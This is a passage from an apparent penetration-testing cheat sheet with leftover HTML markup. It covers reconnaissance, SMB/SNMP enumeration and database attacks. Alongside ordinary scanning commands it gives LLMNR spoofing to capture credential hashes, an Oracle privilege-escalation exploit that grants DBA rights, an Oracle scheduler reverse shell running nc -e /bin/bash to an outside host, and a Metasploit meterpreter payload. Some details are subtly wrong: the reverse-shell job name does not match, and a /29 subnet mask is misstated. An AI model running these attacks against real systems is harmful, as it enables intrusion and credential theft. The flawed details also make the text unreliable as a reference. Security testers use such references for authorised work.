`<a href="#local-windows-metasploit-modules-exploits" id="markdown-toc-local-windows-metasploit-modules-exploits">`{=html}Local
Windows Metasploit Modules (exploits)`</a>`{=html}
</li>
<li>
`<a href="#auxilary-metasploit-modules" id="markdown-toc-auxilary-metasploit-modules">`{=html}Auxilary
Metasploit Modules`</a>`{=html}
</li>
<li>
`<a href="#metasploit-powershell-modules" id="markdown-toc-metasploit-powershell-modules">`{=html}Metasploit
Powershell Modules`</a>`{=html}
</li>
<li>
`<a href="#post-exploit-windows-metasploit-modules" id="markdown-toc-post-exploit-windows-metasploit-modules">`{=html}Post
Exploit Windows Metasploit Modules`</a>`{=html}
</li>
</ul>
</li>
<li>
`<a href="#ascii-table-cheat-sheet" id="markdown-toc-ascii-table-cheat-sheet">`{=html}ASCII
Table Cheat Sheet`</a>`{=html}
</li>
<li>
`<a href="#cisco-ios-commands" id="markdown-toc-cisco-ios-commands">`{=html}CISCO
IOS Commands`</a>`{=html}
</li>
<li>
`<a href="#cryptography" id="markdown-toc-cryptography">`{=html}Cryptography`</a>`{=html}
<ul>
<li>
`<a href="#hash-lengths" id="markdown-toc-hash-lengths">`{=html}Hash
Lengths`</a>`{=html}
</li>
<li>
`<a href="#hash-examples" id="markdown-toc-hash-examples">`{=html}Hash
Examples`</a>`{=html}
</li>
</ul>
</li>
<li>
`<a href="#sqlmap-examples" id="markdown-toc-sqlmap-examples">`{=html}SQLMap
Examples`</a>`{=html}
</li>
<li>
`<a href="#document-changelog" id="markdown-toc-document-changelog">`{=html}Document
Changelog`</a>`{=html}
</li>
</ul>
<h2 id="pre-engagement">
Pre-engagement
</h2>
<h3 id="network-configuration">
Network Configuration
</h3>
<h4 id="set-ip-address">
Set IP Address
</h4>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>ifconfig eth0 xxx.xxx.xxx.xxx/24 
</code></pre>
:::
::::

<h4 id="subnetting">
Subnetting
</h4>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>ipcalc xxx.xxx.xxx.xxx/24 
ipcalc xxx.xxx.xxx.xxx 255.255.255.0 
</code></pre>
:::
::::

<h2 id="osint">
OSINT
</h2>
<h3 id="passive-information-gathering">
Passive Information Gathering
</h3>
<h4 id="dns">
DNS
</h4>
<h5 id="whois-enumeration">
WHOIS enumeration
</h5>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>whois domain-name-here.com 
</code></pre>
:::
::::

<h5 id="perform-dns-ip-lookup">
Perform DNS IP Lookup
</h5>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>dig a domain-name-here.com @nameserver 
</code></pre>
:::
::::

<h5 id="perform-mx-record-lookup">
Perform MX Record Lookup
</h5>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>dig mx domain-name-here.com @nameserver
</code></pre>
:::
::::

<h5 id="perform-zone-transfer-with-dig">
Perform Zone Transfer with DIG
</h5>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>dig axfr domain-name-here.com @nameserver
</code></pre>
:::
::::

<h2 id="dns-zone-transfers">
DNS Zone Transfers
</h2>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>
`<code>`{=html}nslookup -\> set type=any -\> ls -d
blah.com`</code>`{=html}
</p>
</td>
<td>
<p>
Windows DNS zone transfer
</p>
</td>
</tr>
<tr>
<td>
<p>
`<code>`{=html}dig axfr blah.com @ns1.blah.com`</code>`{=html}
</p>
</td>
<td>
<p>
Linux DNS zone transfer
</p>
</td>
</tr>
</tbody>
</table>
:::

<h4 id="email">
Email
</h4>
<h5 id="simply-email">
Simply Email
</h5>
<p>
Use Simply Email to enumerate all the online places (github, target site
etc), it works better if you use proxies or set long throttle times so
google doesn't think you're a robot and make you fill out a Captcha.
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>git clone https://github.com/killswitch-GUI/SimplyEmail.git
./SimplyEmail.py -all -e TARGET-DOMAIN
</code></pre>
:::
::::

<p>
Simply Email can verify the discovered email addresss after gathering.
</p>
<h3 id="semi-active-information-gathering">
Semi Active Information Gathering
</h3>
<h4 id="basic-finger-printing">
Basic Finger Printing
</h4>
<p>
Manual finger printing / banner grabbing.
</p>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>

    <tr>
      <td>
        <p><code>nc -v 192.168.1.1 25</code></p>
        <p><code>telnet 192.168.1.1 25</code></p>
      </td>
      <td>
            <p>Basic versioning / finger printing via displayed banner</p>
      </td>
    </tr>

</tbody>
</table>
:::

<h4 id="banner-grabbing-with-nc">
Banner grabbing with NC
</h4>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>nc TARGET-IP 80
GET / HTTP/1.1
Host: TARGET-IP
User-Agent: Mozilla/5.0
Referrer: meh-domain
&lt;enter&gt;
</code></pre>
:::
::::

<h3 id="active-information-gathering">
Active Information Gathering
</h3>
<h4 id="dns-bruteforce">
DNS Bruteforce
</h4>
<h5 id="dnsrecon">
DNSRecon
</h5>
<section class="shellbox">

:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: {.unit .golden-large .code}
      <p class="title">DNS Enumeration Kali - DNSRecon</p>
      <div class="shell">
        <p class="line">
          <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
          <span class="command">dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml</span>
        </p>
      </div>
    </div>

</section>
<h4 id="port-scanning">
Port Scanning
</h4>
<h5 id="nmap-commands">
Nmap Commands
</h5>
<p>
For more commands, see the Nmap cheat sheet (link in the menu on the
right).
</p>
<p>
Basic Nmap Commands:
</p>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>

    <tbody>
    <tr>
      <td>
        <p><code>nmap -v -sS -A -T4 target</code></p>
      </td>
      <td>
            <p>Nmap verbose scan, runs syn stealth, T4 timing (should be ok on LAN), OS and service version info, traceroute and scripts against services</p>
      </td>
    </tr>

        <tr>
      <td>
        <p><code>nmap -v -sS -p--A -T4 target</code></p>
      </td>
      <td>
            <p>As above but scans all TCP ports (takes a lot longer)</p>
      </td>
    </tr>
    <tr>
      <td>
        <p><code>nmap -v -sU -sS -p- -A -T4 target</code></p>
      </td>
      <td>
            <p>As above but scans all TCP ports and UDP scan (takes even longer)</p>
      </td>
    <tr>
      <td>
        <p><code>nmap -v -p 445 --script=smb-check-vulns <br />--script-args=unsafe=1 192.168.1.X</code></p>
      </td>
      <td>
            <p>Nmap script to scan for vulnerable SMB servers - WARNING: unsafe=1 may cause knockover</p>
      </td>
    </tr>
      <td>
        <p><code>ls /usr/share/nmap/scripts/* | grep ftp</code></p>
      </td>
      <td>
            <p>Search nmap scripts for keywords</p>
      </td>
    </tr>

</tbody>
</table>
:::

<p>
I've had a few people mention about T4 scans, apply common sense here.
Don't use T4 commands on external pen tests (when using an Internet
connection), you're probably better off using a T2 with a TCP connect
scan. A T4 scan would likely be better suited for an internal pen test,
over low latency links with plenty of bandwidth. But it all depends on
the target devices, embeded devices are going to struggle if you T4 / T5
them and give inconclusive results. As a general rule of thumb, scan as
slowly as you can, or do a fast scan for the top 1000 so you can start
pen testing then kick off a slower scan.
</p>
<h6 id="nmap-udp-scanning">
Nmap UDP Scanning
</h6>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>nmap -sU TARGET 
</code></pre>
:::
::::

<h6 id="udp-protocol-scanner">
UDP Protocol Scanner
</h6>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>git clone https://github.com/portcullislabs/udp-proto-scanner.git
</code></pre>
:::
::::

<p>
Scan a file of IP addresses for all services:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>./udp-protocol-scanner.pl -f ip.txt 
</code></pre>
:::
::::

<p>
Scan for a specific UDP service:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>udp-proto-scanner.pl -p ntp -f ips.txt
</code></pre>
:::
::::

<h6 id="other-host-discovery">
Other Host Discovery
</h6>
<p>
Other methods of host discovery, that don't use nmap...
</p>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>

    <tbody>

    <tr>
      <td>
        <p><code>netdiscover -r 192.168.1.0/24</code></p>
      </td>
      <td>
            <p>Discovers IP, MAC Address and MAC vendor on the subnet from ARP, helpful for confirming you're on the right VLAN at $client site</p>
      </td>

    </tr>

</tbody>
</table>
:::

<h2 id="enumeration--attacking-network-services">
Enumeration & Attacking Network Services
</h2>
<p>
Penetration testing tools that spefically identify and / or enumerate
network services:
</p>
<h3 id="samb--smb--windows-domain-enumeration">
SAMB / SMB / Windows Domain Enumeration
</h3>
<h4 id="samba-enumeration">
Samba Enumeration
</h4>
<h5 id="smb-enumeration-tools">
SMB Enumeration Tools
</h5>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>nmblookup -A target
smbclient //MOUNT/share -I target -N
rpcclient -U "" target
enum4linux target
</code></pre>
:::
::::

<p>
Also see, nbtscan cheat sheet (right hand menu).
</p>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>

    <tbody>
        <tr>
        <td>
          <p><code>nbtscan 192.168.1.0/24</code></p>
        </td>
        <td><p>Discover Windows / Samba servers on subnet, finds Windows MAC addresses, netbios name and discover client workgroup / domain</p></td>
      </tr>

       <tr>
        <td>
          <p><code>enum4linux -a target-ip</code></p>
        </td>
        <td>
              <p>Do Everything, runs all options (find windows client domain / workgroup) apart from dictionary based share name guessing</p>
        </td>
      </tr>
    </tbody>

</table>
:::

<h5 id="fingerprint-smb-version">
Fingerprint SMB Version
</h5>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>smbclient -L //192.168.1.100 
</code></pre>
:::
::::

<h5 id="find-open-smb-shares">
Find open SMB Shares
</h5>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24   
</code></pre>
:::
::::

<h5 id="enumerate-smb-users">
Enumerate SMB Users
</h5>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.200-254 
</code></pre>
:::
::::

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>python /usr/share/doc/python-impacket-doc/examples
/samrdump.py 192.168.XXX.XXX
</code></pre>
:::
::::

<p>
RID Cycling:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>ridenum.py 192.168.XXX.XXX 500 50000 dict.txt
</code></pre>
:::
::::

<p>
Metasploit module for RID cycling:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>use auxiliary/scanner/smb/smb_lookupsid
</code></pre>
:::
::::

<h5 id="manual-null-session-testing">
Manual Null session testing:
</h5>
<p>
Windows:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>net use \\TARGET\IPC$ "" /u:""
</code></pre>
:::
::::

<p>
Linux:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>smbclient -L //192.168.99.131
</code></pre>
:::
::::

<h5 id="nbtscan-unixwiz">
NBTScan unixwiz
</h5>
<p>
Install on Kali rolling:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>apt-get install nbtscan-unixwiz 
nbtscan-unixwiz -f 192.168.0.1-254 &gt; nbtscan
</code></pre>
:::
::::

<h3 id="llmnr--nbt-ns-spoofing">
LLMNR / NBT-NS Spoofing
</h3>
<p>
Steal credentials off the network.
</p>
<h5 id="metasploit-llmnr--netbios-requests">
Metasploit LLMNR / NetBIOS requests
</h5>
<p>
Spoof / poison LLMNR / NetBIOS requests:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>auxiliary/spoof/llmnr/llmnr_response
auxiliary/spoof/nbns/nbns_response
</code></pre>
:::
::::

<p>
Capture the hashes:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>auxiliary/server/capture/smb
auxiliary/server/capture/http_ntlm
</code></pre>
:::
::::

<p>
You'll end up with NTLMv2 hash, use john or hashcat to crack it.
</p>
<h4 id="responderpy">
Responder.py
</h4>
<p>
Alternatively you can use responder.
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>git clone https://github.com/SpiderLabs/Responder.git
python Responder.py -i local-ip -I eth0
</code></pre>
:::
::::

::: {.note .tip}
<h5>
Run Responder.py for the whole engagement
</h5>
<p>
Run Responder.py for the length of the engagement while you're working
on other attack vectors.
</p>
:::

<h3 id="snmp-enumeration-tools">
SNMP Enumeration Tools
</h3>
<p>
A number of SNMP enumeration tools.
</p>
<p>
Fix SNMP output values so they are human readable:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>apt-get install snmp-mibs-downloader download-mibs
echo "" &gt; /etc/snmp/snmp.conf
</code></pre>
:::
::::

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Command
</th>
<th>
Description
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>
`<code>`{=html}snmpcheck -t 192.168.1.X -c public`</code>`{=html}
</p>
<p>
`<code>`{=html}snmpwalk -c public -v1 192.168.1.X 1\| `<br />`{=html}
grep hrSWRunName\|cut -d\* \* -f `</code>`{=html}
</p>
<p>
`<code>`{=html}snmpenum -t 192.168.1.X`</code>`{=html}
</p>
<p>
`<code>`{=html}onesixtyone -c names -i hosts`</code>`{=html}
</p>
</td>
<td>
SNMP enumeration
</td>
</tr>
</tbody>
</table>
:::

<h4 id="snmpv3-enumeration-tools">
SNMPv3 Enumeration Tools
</h4>
<p>
Idenitfy SNMPv3 servers with nmap:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>nmap -sV -p 161 --script=snmp-info TARGET-SUBNET
</code></pre>
:::
::::

<p>
Rory McCune's snmpwalk wrapper script helps automate the username
enumeration process for SNMPv3:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>apt-get install snmp snmp-mibs-downloader
wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb
</code></pre>
:::
::::

::: {.note .tip}
<h5>
Use Metasploits Wordlist
</h5>
<p>
Metasploit's wordlist (KALI path below) has common credentials for v1 &
2 of SNMP, for newer credentials check out Daniel Miessler's SecLists
project on GitHub (not the mailing list!).
</p>
:::

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt
</code></pre>
:::
::::

<h3 id="r-services-enumeration">
R Services Enumeration
</h3>
<p>
This is legacy, included for completeness.
</p>
<p>
nmap -A will perform all the rservices enumeration listed below, this
section has been added for completeness or manual confirmation:
</p>
<h4 id="rsh-enumeration">
RSH Enumeration
</h4>
<h5 id="rsh-run-commands">
RSH Run Commands
</h5>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>rsh &lt;target&gt; &lt;command&gt;
</code></pre>
:::
::::

<h5 id="metasploit-rsh-login-scanner">
Metasploit RSH Login Scanner
</h5>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>auxiliary/scanner/rservices/rsh_login
</code></pre>
:::
::::

<h5 id="rusers-show-logged-in-users">
rusers Show Logged in Users
</h5>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>rusers -al 192.168.2.1
</code></pre>
:::
::::

<h5 id="rusers-scan-whole-subnet">
rusers scan whole Subnet
</h5>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>rlogin -l &lt;user&gt; &lt;target&gt;
</code></pre>
:::
::::

<p>
e.g rlogin -l root TARGET-SUBNET/24
</p>
<h3 id="finger-enumeration">
Finger Enumeration
</h3>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>finger @TARGET-IP
</code></pre>
:::
::::

<h4 id="finger-a-specific-username">
Finger a Specific Username
</h4>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>finger batman@TARGET-IP 
</code></pre>
:::
::::

<h4 id="solaris-bug-that-shows-all-logged-in-users">
Solaris bug that shows all logged in users:
</h4>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>finger 0@host  

SunOS: RPC services allow user enum:
$ rusers # users logged onto LAN

finger 'a b c d e f g h'@sunhost 
</code></pre>
:::
::::

<h3 id="rwho">
rwho
</h3>
<p>
Use nmap to identify machines running rwhod (513 UDP)
</p>
<h2 id="tls--ssl-testing">
TLS & SSL Testing
</h2>
<h3 id="testsslsh">
testssl.sh
</h3>
<p>
Test all the things on a single host and output to a .html file:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST | aha &gt; OUTPUT-FILE.html  
</code></pre>
:::
::::

<h2 id="vulnerability-assessment">
Vulnerability Assessment
</h2>
<p>
Install OpenVAS 8 on Kali Rolling:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>apt-get update
apt-get dist-upgrade -y
apt-get install openvas
openvas-setup
</code></pre>
:::
::::

<p>
Verify openvas is running using:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>netstat -tulpn
</code></pre>
:::
::::

<p>
Login at https://127.0.0.1:9392 - credentials are generated during
openvas-setup.
</p>
<h2 id="database-penetration-testing">
Database Penetration Testing
</h2>
<p>
Attacking database servers exposed on the network.
</p>
<h3 id="oracle">
Oracle
</h3>
<p>
Install oscanner:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>apt-get install oscanner  
</code></pre>
:::
::::

<p>
Run oscanner:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>oscanner -s 192.168.1.200 -P 1521 
</code></pre>
:::
::::

<h4 id="fingerprint-oracle-tns-version">
Fingerprint Oracle TNS Version
</h4>
<p>
Install tnscmd10g:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>apt-get install tnscmd10g
</code></pre>
:::
::::

<p>
Fingerprint oracle tns:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>tnscmd10g version -h TARGET
nmap --script=oracle-tns-version 
</code></pre>
:::
::::

<h4 id="brute-force-oracle-user-accounts">
Brute force oracle user accounts
</h4>
<p>
Identify default Oracle accounts:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code> nmap --script=oracle-sid-brute 
 nmap --script=oracle-brute 
</code></pre>
:::
::::

<p>
Run nmap scripts against Oracle TNS:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>nmap -p 1521 -A TARGET
</code></pre>
:::
::::

<h4 id="oracle-privilege-escalation">
Oracle Privilege Escalation
</h4>
<p>
Requirements:
</p>
<ul>
<li>
Oracle needs to be exposed on the network
</li>
<li>
A default account is in use like scott
</li>
</ul>
<p>
Quick overview of how this works:
</p>
<ol>
<li>
Create the function
</li>
<li>
Create an index on table SYS.DUAL
</li>
<li>
The index we just created executes our function SCOTT.DBA_X
</li>
<li>
The function will be executed by SYS user (as that's the user that owns
the table).
</li>
<li>
Create an account with DBA priveleges
</li>
</ol>
<p>
In the example below the user SCOTT is used but this should be possible
with another default Oracle account.
</p>
<h5 id="identify-default-accounts-within-oracle-db-using-nmap-nse-scripts">
Identify default accounts within oracle db using NMAP NSE scripts:
</h5>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>nmap --script=oracle-sid-brute 
nmap --script=oracle-brute 
</code></pre>
:::
::::

<p>
Login using the identified weak account (assuming you find one).
</p>
<h5 id="how-to-identify-the-current-privilege-level-for-an-oracle-user">
How to identify the current privilege level for an oracle user:
</h5>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>SQL&gt; select * from session_privs; 

SQL&gt; CREATE OR REPLACE FUNCTION GETDBA(FOO varchar) return varchar deterministic authid 
curren_user is 
pragma autonomous_transaction; 
begin 
execute immediate 'grant dba to user1 identified by pass1';
commit;
return 'FOO';
end;
</code></pre>
:::
::::

<h5 id="oracle-priv-esc-and-obtain-dba-access">
Oracle priv esc and obtain DBA access:
</h5>
<p>
Run netcat: `<code>`{=html}netcat -nvlp 443`</code>`{=html}code\>
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>SQL&gt; create index exploit_1337 on SYS.DUAL(SCOTT.GETDBA('BAR'));
</code></pre>
:::
::::

<h5 id="run-the-exploit-with-a-select-query">
Run the exploit with a select query:
</h5>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>SQL&gt; Select * from session_privs; 
</code></pre>
:::
::::

<p>
You should have a DBA user with creds user1 and pass1.
</p>
<p>
Verify you have DBA privileges by re-running the first command again.
</p>
<h5 id="remove-the-exploit-using">
Remove the exploit using:
</h5>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>drop index exploit_1337; 
</code></pre>
:::
::::

<h5 id="get-oracle-reverse-os-shell">
Get Oracle Reverse os-shell:
</h5>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>begin
dbms_scheduler.create_job( job_name    =&gt; 'MEH1337',job_type    =&gt;
    'EXECUTABLE',job_action =&gt; '/bin/nc',number_of_arguments =&gt; 4,start_date =&gt;
    SYSTIMESTAMP,enabled    =&gt; FALSE,auto_drop =&gt; TRUE); 
dbms_scheduler.set_job_argument_value('rev_shell', 1, 'TARGET-IP');
dbms_scheduler.set_job_argument_value('rev_shell', 2, '443');
dbms_scheduler.set_job_argument_value('rev_shell', 3, '-e');
dbms_scheduler.set_job_argument_value('rev_shell', 4, '/bin/bash');
dbms_scheduler.enable('rev_shell'); 
end; 
</code></pre>
:::
::::

<h3 id="mssql">
MSSQL
</h3>
<p>
Enumeration / Discovery:
</p>
<p>
Nmap:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156
</code></pre>
:::
::::

<p>
Metasploit:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>msf &gt; use auxiliary/scanner/mssql/mssql_ping
</code></pre>
:::
::::

::: {.note .tip}
<h5>
Use MS SQL Servers Browse For More
</h5>
<p>
Try using "Browse for More" via MS SQL Server Management Studio
</p>
:::

<h4 id="bruteforce-mssql-login">
Bruteforce MSSQL Login
</h4>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>msf &gt; use auxiliary/admin/mssql/mssql_enum
</code></pre>
:::
::::

<h4 id="metasploit-mssql-shell">
Metasploit MSSQL Shell
</h4>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>msf &gt; use exploit/windows/mssql/mssql_payload
msf exploit(mssql_payload) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
</code></pre>
:::
::::

<h2 id="network">
Network
</h2>
<h3 id="plinkexe-tunnel">
Plink.exe Tunnel
</h3>
<p>
PuTTY Link tunnel
</p>
<p>
Forward remote port to local address:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>plink.exe -P 22 -l root -pw "1337" -R 445:127.0.0.1:445 REMOTE-IP
</code></pre>
:::
::::

<h3 id="pivoting">
Pivoting
</h3>
<h4 id="ssh-pivoting">
SSH Pivoting
</h4>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>ssh -D 127.0.0.1:1010 -p 22 user@pivot-target-ip
</code></pre>
:::
::::

<p>
Add socks4 127.0.0.1 1010 in /etc/proxychains.conf
</p>
<p>
SSH pivoting from one network to another:
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>ssh -D 127.0.0.1:1010 -p 22 user1@ip-address-1
</code></pre>
:::
::::

<p>
Add socks4 127.0.0.1 1010 in /etc/proxychains.conf
</p>

:::: {.language-plaintext .highlighter-rouge}
::: highlight
<pre class="highlight"><code>proxychains ssh -D 127.0.0.1:1011 -p 22 user1@ip-address-2
</code></pre>
:::
::::

<p>
Add socks4 127.0.0.1 1011 in /etc/proxychains.conf
</p>
<h4 id="meterpreter-pivoting">
Meterpreter Pivoting
</h4>
<h3 id="ttl-finger-printing">
TTL Finger Printing
</h3>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Operating System
</th>
<th>
TTL Size
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>
Windows
</p>
</td>
<td>
<p>
`<code>`{=html}128`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
Linux
</p>
</td>
<td>
<p>
`<code>`{=html}64`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
Solaris
</p>
</td>
<td>
<p>
`<code>`{=html}255`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
Cisco / Network
</p>
</td>
<td>
<p>
`<code>`{=html}255`</code>`{=html}
</p>
</td>
</tr>
</tbody>
</table>
:::

<h3 id="ipv4-cheat-sheets">
IPv4 Cheat Sheets
</h3>
<h4 id="classful-ip-ranges">
Classful IP Ranges
</h4>
<p>
E.g Class A,B,C (depreciated)
</p>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Class
</th>
<th>
IP Address Range
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>
Class A IP Address Range
</p>
</td>
<td>
<p>
`<code>`{=html}0.0.0.0 - 127.255.255.255`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
Class B IP Address Range
</p>
</td>
<td>
<p>
`<code>`{=html}128.0.0.0 - 191.255.255.255`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
Class C IP Address Range
</p>
</td>
<td>
<p>
`<code>`{=html}192.0.0.0 - 223.255.255.255`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
Class D IP Address Range
</p>
</td>
<td>
<p>
`<code>`{=html}224.0.0.0 - 239.255.255.255`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
Class E IP Address Range
</p>
</td>
<td>
<p>
`<code>`{=html}240.0.0.0 - 255.255.255.255`</code>`{=html}
</p>
</td>
</tr>
</tbody>
</table>
:::

<h4 id="ipv4-private-address-ranges">
IPv4 Private Address Ranges
</h4>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Class
</th>
<th>
Range
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>
Class A Private Address Range
</p>
</td>
<td>
<p>
`<code>`{=html}10.0.0.0 - 10.255.255.255`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
Class B Private Address Range
</p>
</td>
<td>
<p>
`<code>`{=html}172.16.0.0 - 172.31.255.255`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
Class C Private Address Range
</p>
</td>
<td>
<p>
`<code>`{=html}192.168.0.0 - 192.168.255.255`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
</p>
</td>
<td>
<p>
`<code>`{=html}127.0.0.0 - 127.255.255.255`</code>`{=html}
</p>
</td>
</tr>
</tbody>
</table>
:::

<h4 id="ipv4-subnet-cheat-sheet">
IPv4 Subnet Cheat Sheet
</h4>
<p>
Subnet cheat sheet, not really realted to pen testing but a useful
reference.
</p>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
CIDR
</th>
<th>
Decimal Mask
</th>
<th>
Number of Hosts
</th>
</tr>
</thead>
<tbody>
<tr>
<td>
<p>
/31
</p>
</td>
<td>
<p>
`<code>`{=html}255.255.255.254`</code>`{=html}
</p>
</td>
<td>
<p>
`<code>`{=html}1 Host`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
/30
</p>
</td>
<td>
<p>
`<code>`{=html}255.255.255.252`</code>`{=html}
</p>
</td>
<td>
<p>
`<code>`{=html}2 Hosts`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
/29
</p>
</td>
<td>
<p>
`<code>`{=html}255.255.255.249`</code>`{=html}
</p>
</td>
<td>
<p>
`<code>`{=html}6 Hosts`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
/28
</p>
</td>
<td>
<p>
`<code>`{=html}255.255.255.240`</code>`{=html}
</p>
</td>
<td>
<p>
`<code>`{=html}14 Hosts`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
/27
</p>
</td>
<td>
<p>
`<code>`{=html}255.255.255.224`</code>`{=html}
</p>
</td>
<td>
<p>
`<code>`{=html}30 Hosts`</code>`{=html}
</p>
</td>
</tr>
<tr>
<td>
<p>
/26
</p>
</td>
<td>
<p>
